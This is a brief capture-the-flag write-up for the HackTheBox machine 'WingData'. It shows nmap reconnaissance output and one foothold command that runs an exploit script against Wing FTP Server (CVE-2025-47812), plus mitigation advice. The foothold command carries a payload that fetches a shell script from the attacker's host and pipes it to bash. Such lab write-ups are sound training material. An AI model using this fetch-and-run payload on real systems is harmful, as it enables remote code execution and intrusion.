<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge" alt="Easy Difficulty" />
</p>

# WingData Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.11.72
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-18 14:28 UTC
Nmap scan report for 10.129.11.72
Host is up (0.46s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: storage-misc|general purpose|specialized|WAP
Running (JUST GUESSING): HP embedded (91%), Linux 4.X|5.X|2.6.X|2.4.X (89%), Crestron 2-Series (86%)
OS CPE: cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6.22
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 4.15 - 5.8 (89%), Linux 5.0 - 5.4 (89%), Linux 5.3 - 5.4 (88%), Linux 5.0 (88%), Linux 2.6.32 (87%), Crestron XPanel control system (86%), Linux 5.0 - 5.5 (86%), Linux 5.4 (86%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   375.37 ms 10.10.14.1
2   498.66 ms 10.129.11.72

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.12 seconds
```

> — Easy Linux Machine, lets dig into the Web.

## Step 2 - Initial Foothold

```bash
python3 rce.py -u "http://ftp.wingdata.htb/" -c "wget -O- http://10.10.15.133:8000/shell.sh | bash" -U "anonymous"
```

## Mitigation & Security Perspective

> [!CAUTION]
> **CVE-2025-47812 - Unauthenticated RCE in Wing FTP Server**
> The Wing FTP Server v7.4.3 is vulnerable to unauthenticated Remote Code Execution (RCE) via administrative endpoint scripting.
> **Mitigation:** Upgrade Wing FTP Server to the latest secure version. Disable anonymous user access if not strictly required, and implement network-level access controls to restrict access to FTP administrative ports and dashboards to trusted administrative IP addresses.
